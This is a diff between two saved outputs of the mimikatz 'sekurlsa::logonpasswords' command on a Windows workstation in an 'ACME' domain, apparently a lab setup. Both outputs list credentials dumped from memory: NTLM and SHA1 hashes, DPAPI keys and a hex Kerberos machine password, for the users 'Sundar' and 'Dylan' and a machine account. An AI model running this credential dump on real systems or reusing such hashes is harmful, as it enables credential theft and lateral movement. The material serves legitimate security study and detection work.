@@ -1,5 +1,4 @@
 
-
   .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
@@ -18,37 +17,39 @@ mimikatz(commandline) # sekurlsa::logonpasswords
 
 
 
-Authentication Id : 0 ; 55811 (00000000:0000da03)
+Authentication Id : 0 ; 231763 (00000000:00038953)
 
 Session           : Interactive from 1
 
-User Name         : DWM-1
+User Name         : Sundar
 
-Domain            : Window Manager
+Domain            : ACME
 
-Logon Server      : (null)
+Logon Server      : ACME-SRV-DC01
 
-Logon Time        : 5/28/2023 10:40:48 PM
+Logon Time        : 5/29/2023 10:55:00 PM
 
-SID               : S-1-5-90-0-1
+SID               : S-1-5-21-2805447627-3462665695-1070208865-30109
 
 	msv :	
 
 	 [00000003] Primary
 
-	 * Username : ACME-WRK-USR01$
+	 * Username : Sundar
 
 	 * Domain   : ACME
 
-	 * NTLM     : 8f2d81fe99ccd7225fed40268cdbd25a
+	 * NTLM     : 9bff06fe611486579fb74037890fda96
 
-	 * SHA1     : e39bdfaec5cb2dbd0a42a1a87b19513c3dab0b90
+	 * SHA1     : dbcfd8fabbca37e08ece91aa7e46f9d87883d83d
+
+	 * DPAPI    : a283c7aa6651c12cf4dfcc4e3aab58bf
 
 	tspkg :	
 
 	wdigest :	
 
-	 * Username : ACME-WRK-USR01$
+	 * Username : Sundar
 
 	 * Domain   : ACME
 
@@ -56,11 +57,11 @@ SID               : S-1-5-90-0-1
 
 	kerberos :	
 
-	 * Username : ACME-WRK-USR01$
+	 * Username : Sundar
 
 	 * Domain   : ACME.LOCAL
 
-	 * Password : a2 1a 54 2b c8 8e c0 c4 55 2f 3c 21 cc 0f b1 5f d8 8e f8 93 d3 60 e2 92 9c 28 d2 43 3d 0f 24 56 d8 e7 86 46 47 11 a8 d9 8e 6a 13 8f 53 5f 39 0a 94 25 16 b3 9b ac 4b bf e5 63 58 dd 21 35 6d bf 96 33 14 e8 f4 0a d1 a6 49 bf 76 59 b2 c7 ce ad e2 82 78 4e 5d f9 53 8f a7 86 28 71 ef 01 0e 20 9d 17 8f 23 57 05 e3 63 43 bc a6 c2 fa 2a 0d 06 8e 09 ed 4d 31 08 6b c0 7a 40 eb 92 e7 37 37 0f 2b f3 34 bc c6 94 22 11 e3 e4 69 d5 8b 77 64 17 36 8b 6b 61 d5 e6 ec 83 5b 3b 2f 1e 80 3e 23 d9 52 a7 ed 83 19 1e 0c f5 eb 26 5b 51 63 82 3c ec e0 c3 43 e7 51 99 48 43 1c e3 36 df a7 42 f7 e1 56 cb ab c5 05 19 5b 15 e5 0d aa 81 dd 5d 13 42 c0 15 0b 0e 73 07 b0 3f 17 46 97 c5 b4 e4 2c b7 37 76 f3 31 58 75 57 a5 89 f6 7f 5d ed 6b d3 38 
+	 * Password : (null)
 
 	ssp :	
 
@@ -78,7 +79,7 @@ Domain            : ACME
 
 Logon Server      : (null)
 
-Logon Time        : 5/28/2023 10:40:48 PM
+Logon Time        : 5/29/2023 10:54:33 PM
 
 SID               : S-1-5-20
 
@@ -118,39 +119,39 @@ SID               : S-1-5-20
 
 
 
-Authentication Id : 0 ; 1645454 (00000000:00191b8e)
+Authentication Id : 0 ; 232035 (00000000:00038a63)
 
 Session           : Interactive from 1
 
-User Name         : Dylan
+User Name         : Sundar
 
 Domain            : ACME
 
 Logon Server      : ACME-SRV-DC01
 
-Logon Time        : 5/29/2023 4:51:42 PM
+Logon Time        : 5/29/2023 10:55:00 PM
 
-SID               : S-1-5-21-2805447627-3462665695-1070208865-30108
+SID               : S-1-5-21-2805447627-3462665695-1070208865-30109
 
 	msv :	
 
 	 [00000003] Primary
 
-	 * Username : Dylan
+	 * Username : Sundar
 
 	 * Domain   : ACME
 
-	 * NTLM     : 8c3efc486704d2ee71eebe71af14d86c
+	 * NTLM     : 9bff06fe611486579fb74037890fda96
 
-	 * SHA1     : 2563fb4faf7fa08c1c24d1df329c17667554c388
+	 * SHA1     : dbcfd8fabbca37e08ece91aa7e46f9d87883d83d
 
-	 * DPAPI    : 0ce3c88e051d79d7b6a9ab70fe7cec80
+	 * DPAPI    : a283c7aa6651c12cf4dfcc4e3aab58bf
 
 	tspkg :	
 
 	wdigest :	
 
-	 * Username : Dylan
+	 * Username : Sundar
 
 	 * Domain   : ACME
 
@@ -158,7 +159,7 @@ SID               : S-1-5-21-2805447627-3462665695-1070208865-30108
 
 	kerberos :	
 
-	 * Username : Dylan
+	 * Username : Sundar
 
 	 * Domain   : ACME.LOCAL
 
@@ -180,7 +181,7 @@ Domain            : NT AUTHORITY
 
 Logon Server      : (null)
 
-Logon Time        : 5/28/2023 10:40:49 PM
+Logon Time        : 5/29/2023 10:54:33 PM
 
 SID               : S-1-5-19
 
@@ -210,7 +211,7 @@ SID               : S-1-5-19
 
 
 
-Authentication Id : 0 ; 55787 (00000000:0000d9eb)
+Authentication Id : 0 ; 55824 (00000000:0000da10)
 
 Session           : Interactive from 1
 
@@ -220,7 +221,7 @@ Domain            : Window Manager
 
 Logon Server      : (null)
 
-Logon Time        : 5/28/2023 10:40:48 PM
+Logon Time        : 5/29/2023 10:54:33 PM
 
 SID               : S-1-5-90-0-1
 
@@ -260,7 +261,57 @@ SID               : S-1-5-90-0-1
 
 
 
-Authentication Id : 0 ; 35374 (00000000:00008a2e)
+Authentication Id : 0 ; 55805 (00000000:0000d9fd)
+
+Session           : Interactive from 1
+
+User Name         : DWM-1
+
+Domain            : Window Manager
+
+Logon Server      : (null)
+
+Logon Time        : 5/29/2023 10:54:33 PM
+
+SID               : S-1-5-90-0-1
+
+	msv :	
+
+	 [00000003] Primary
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME
+
+	 * NTLM     : 8f2d81fe99ccd7225fed40268cdbd25a
+
+	 * SHA1     : e39bdfaec5cb2dbd0a42a1a87b19513c3dab0b90
+
+	tspkg :	
+
+	wdigest :	
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME
+
+	 * Password : (null)
+
+	kerberos :	
+
+	 * Username : ACME-WRK-USR01$
+
+	 * Domain   : ACME.LOCAL
+
+	 * Password : a2 1a 54 2b c8 8e c0 c4 55 2f 3c 21 cc 0f b1 5f d8 8e f8 93 d3 60 e2 92 9c 28 d2 43 3d 0f 24 56 d8 e7 86 46 47 11 a8 d9 8e 6a 13 8f 53 5f 39 0a 94 25 16 b3 9b ac 4b bf e5 63 58 dd 21 35 6d bf 96 33 14 e8 f4 0a d1 a6 49 bf 76 59 b2 c7 ce ad e2 82 78 4e 5d f9 53 8f a7 86 28 71 ef 01 0e 20 9d 17 8f 23 57 05 e3 63 43 bc a6 c2 fa 2a 0d 06 8e 09 ed 4d 31 08 6b c0 7a 40 eb 92 e7 37 37 0f 2b f3 34 bc c6 94 22 11 e3 e4 69 d5 8b 77 64 17 36 8b 6b 61 d5 e6 ec 83 5b 3b 2f 1e 80 3e 23 d9 52 a7 ed 83 19 1e 0c f5 eb 26 5b 51 63 82 3c ec e0 c3 43 e7 51 99 48 43 1c e3 36 df a7 42 f7 e1 56 cb ab c5 05 19 5b 15 e5 0d aa 81 dd 5d 13 42 c0 15 0b 0e 73 07 b0 3f 17 46 97 c5 b4 e4 2c b7 37 76 f3 31 58 75 57 a5 89 f6 7f 5d ed 6b d3 38 
+
+	ssp :	
+
+	credman :	
+
+
+
+Authentication Id : 0 ; 35291 (00000000:000089db)
 
 Session           : UndefinedLogonType from 0
 
@@ -270,7 +321,7 @@ Domain            : (null)
 
 Logon Server      : (null)
 
-Logon Time        : 5/28/2023 10:40:46 PM
+Logon Time        : 5/29/2023 10:54:32 PM
 
 SID               : 
 
@@ -308,7 +359,7 @@ Domain            : ACME
 
 Logon Server      : (null)
 
-Logon Time        : 5/28/2023 10:40:46 PM
+Logon Time        : 5/29/2023 10:54:32 PM
 
 SID               : S-1-5-18
 
